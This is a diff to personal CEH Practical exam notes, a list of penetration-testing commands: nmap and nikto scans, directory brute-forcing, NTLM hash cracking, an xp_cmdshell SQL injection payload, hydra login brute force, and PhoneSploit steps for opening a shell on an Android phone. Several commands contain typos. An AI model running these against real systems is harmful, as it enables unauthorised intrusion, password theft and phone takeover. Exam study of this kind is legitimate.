@@ -4,6 +4,8 @@ CEH Practical Notes
 nmap -sn 170.16.0.1/24 -oN nmap.txt
 nmap -O 170.16.0.1/24 -oN namp-OS.txt
 namp -sC -sV -sS 170.16.0.20 -oN namp-all.txt
+nmap -sP 198.168.1.0/24 -oN test.txt
+nmap -iL assetscorp -Pn -sU -vv -oA udpsummaryservicescan
 
 2) Zenmap
 nmap -sn -PR 170.16.0.1/24  arp ping
@@ -95,11 +97,14 @@ smbclient //IP/sharepath [connect to share path]
 gobuster -e -u http://10.10.10.10 -w wordlsit.txt
 gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-*.txt -x jpg,png,php,aspx,css,html
 dirb http://10.10.10.10 wordlist.txt
+python3 dirsearch.py –u http://insanity.labs.vh –E –x 403
 
 
 Active Directory LDAP Enumeration : ADExplorer
 Module 05 : Vulnerability Analysis 
 nikto -h  http://www.goodshopping.com/ -Tuning 1  (optional: -Tuning 1)
+nikto -h <Target IP Address> -o <File_Name> -F txt (save in a file)
+nikto -h <Target Website> -Cgidirs all
 
 Nessus runs on https://localhost:8834/
 Username: admin 
@@ -123,13 +128,14 @@ responder -I eth0
 usr\share\responder\logs --> Responder log location
 
 john /usr/share/responder/logs/ntlm.txt
+john /home/ubuntu/Responderllogs/<Log File Name.txt>
 
 Rainbow table crack using Winrtgen :
 Open winrtgen and add new table
 Select ntlm from Hash dropdown list.
 Set Min Len as 4, Max Len as 6 and Chain Count 4000000
 Select loweralpha from Charset dropdown list (it depends upon Password).
- rcrack_gui.exe to crack hash with rainbow table
+rcrack_gui.exe to crack hash with rainbow table
 
 Hash dump with Pwdump7 and crack with ophcrack :
 wmic useraccount get name,sid --> Get user acc names and SID
@@ -215,7 +221,7 @@ blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
 
 Some of the service brute force with hydra:
 
-    hydra -l root -P passwords.txt [-t 32] <IP> ftp
+    hydra -l root -P passwords.txt [-t 32] ftp://
     hydra -L usernames.txt -P pass.txt <IP> mysql
     hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
     hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
@@ -260,3 +266,15 @@ SYN flooding attack
 Statistics from the menu bar, and then click the I/O Graph
 Hijacking Attack ARP packets
 Covert TCP filtro tcp
+
+Android
+apt-get install adb
+type mv /home/attacker/PhoneSploit /root/ .
+cd PhoneSploit
+phyton3 -m pip install colorama
+python3 phonesploit.py
+main_menu prompt appears; type 3 and press Enter to choose Connect a newphone.
+Enter a phones ip address,
+main_menu prompt, type 4 and press Enter to choose Access Shell on a phone.
+cd sdcard
+main_menu prompt, type 7 and press Enter to choose Screen Shot a picture on a phone
